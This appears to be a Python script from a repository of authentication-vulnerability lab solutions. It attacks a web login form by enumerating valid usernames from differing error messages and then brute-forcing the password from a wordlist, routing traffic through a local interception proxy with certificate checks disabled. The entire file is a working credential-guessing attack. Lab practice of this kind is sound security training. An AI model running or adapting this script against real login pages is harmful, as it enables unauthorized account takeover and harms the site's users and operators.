"""
Author: Kien Do
Source: https://github.com/kienmarkdo/Authentication-Vulnerabilities-Labs
"""

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def check_url_exists(url):
    res = requests.get(url, verify=False, proxies=proxies)
    if "<h1>Error</h1><p>Stream&#32;failed&#32;to&#32;close&#32;correctly</p>" in res.text:
        print("[-] ERROR: The webpage you are requesting does not exist...")
        exit(-1) # exit program

def find_valid_username(url, usernames_str):

    username_extracted = ""
    
    # find the username
    print("[+] Determining the username via enumeration...")
    for username in usernames_str:
        r = requests.post(url, verify=False, proxies=proxies, data="username=%s&password=test" % username)
        if "Invalid username or password." in r.text:
            continue
        else:
            username_extracted = username
            break
    
    return username_extracted

def find_password_login(url, passwords_str, username):

    password_extracted = ""

    print("[+] Determining the username via enumeration...")
    for password in passwords_str:
        r = requests.post(url, verify=False, proxies=proxies, data="username=%s&password=%s" %(username, password))
        if "Log out" in r.text:
            password_extracted = password
            break
    
    return password_extracted

def main():
    
    # verify script parameters
    if len(sys.argv) != 2:
        print('[+] Usage: %s "<url>"' % sys.argv[0])
        print('[+] Example: %s "www.example.com"' % sys.argv[0])
        exit(-1)
    
    # read the given usernames and passwords lists into string variables
    usernames_str = open("usernames_list.txt", "r").read().splitlines()
    passwords_str = open("passwords_list.txt", "r").read().splitlines()

    # extract url of webpage and verify that the url exists (webpage has not expired)
    url = sys.argv[1] + "/login"
    username_extracted = ""
    password_extracted = ""

    check_url_exists(url)

    # extract username
    username_extracted = find_valid_username(url, usernames_str)
    if username_extracted == "":
        print("[-] Failed to find the username...")
        exit(-1)
    else:
        print("[+] Found username succesfully: " + username_extracted)

    # extract password and login
    password_extracted = find_password_login(url, passwords_str, username_extracted)
    if password_extracted == "":
        print("[-] Failed to find the password...")
        exit(-1)
    else:
        print("[+] Found password succesfully: " + password_extracted)

if __name__ == "__main__":
    main()